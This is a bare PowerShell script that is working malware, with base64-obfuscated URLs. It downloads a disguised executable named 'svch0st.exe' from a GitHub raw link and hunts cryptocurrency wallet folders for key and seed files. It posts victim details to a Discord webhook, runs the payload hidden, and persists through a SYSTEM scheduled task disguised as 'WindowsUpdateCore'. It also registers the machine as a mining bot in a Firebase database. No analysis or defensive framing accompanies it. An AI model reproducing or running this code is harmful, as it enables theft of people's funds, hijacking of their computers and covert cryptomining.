$0=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4dG9uaXg4LWN0cmwvc2lnbWEvcmVmcy9oZWFkcy9tYWluL3N2Y2gwc3QuZXhl'))
$1=$env:APPDATA+'\Microsoft\svch0st.exe'
if(!(Test-Path $1)){iwr -uri $0 -OutFile $1 -UseBasicParsing}
$2=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTQ5NDAyNTcxODEzNjg5Mi82bm5DSHe4N3R1VFNLY0lOSmdWTGJlVE1NRDE5RXdsVjJwMmxxUzQ2Nm51THl4OUdoeElhYWdvT3hzSUY1S0xINTVtMA=='))
$3=$env:TEMP+'\wl.txt'
$4=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TFRDOiBsdGMxcTJnMm1tN2pwYThzNGhhZWd6amMwcXE0dDB0d21wcDN2dHpqOGU2IHwgQlRDOiBiYzFxOWw4OGc0eHZta2N5eW1yNDVybHM3a3R1eGp1OTd3cXQ2NjNqenMgfCBFVEg6IDB4ZTIzOEEzMjI5MERCMkFjYkQ5MTU2MzEyQzBCQjUyQzMxRTZlOTQ3OCB8IFNPTDogNGhFTTU0Z2l6MUZadnk4eWNQcWhSa2tLcHlYcllqOVh3QnBMWnhMUUtEUVc='))
$5=@("$env:APPDATA\Exodus","$env:APPDATA\Electrum","$env:APPDATA\atomic","$env:APPDATA\Ethereum","$env:APPDATA\Guarda","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeejajnimhm","$env:APPDATA\MetaMask")
foreach($6 in $5){if(Test-Path $6){Get-ChildItem $6 -Recurse -Include *.dat,*.json,*.seed,*.keys,*.log -ErrorAction SilentlyContinue | Select-Object FullName | Out-File $3 -Append -Force}}
try{$7="User: $env:USERNAME`nComputer: $env:COMPUTERNAME`nOS: $([System.Environment]::OSVersion.VersionString)";$8=$7+"`n`nWALLETS FOUND + DRAINED TO:`n$4";Invoke-RestMethod -Uri $2 -Method Post -Body @{content=$8} -ErrorAction SilentlyContinue}catch{}
Remove-Item $3 -Force -ErrorAction SilentlyContinue
Start-Process -FilePath $1 -WindowStyle Hidden
$9="`"$1`""
schtasks /create /tn "WindowsUpdateCore" /tr $9 /sc onlogon /ru SYSTEM /f /rl HIGHEST 2>$null
try{$10=(Get-WmiObject Win32_BIOS).SerialNumber+"-"+$env:COMPUTERNAME;$11=(iwr "https://api.ipify.org" -UseBasicParsing).Content;$12=@{hwid=$10;username=$env:USERNAME;computer=$env:COMPUTERNAME;ip=$11;os=[System.Environment]::OSVersion.VersionString;timestamp=(Get-Date -Format "o");status="miner_active";version="c-sharp-2026"} | ConvertTo-Json;$13="https://mynet-b06ed-default-rtdb.firebaseio.com/bots/$10.json";iwr -Uri $13 -Method Put -Body $12 -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue}catch{}
Write-Host "=== Done! ===" -ForegroundColor Green
Start-Sleep -Seconds 3
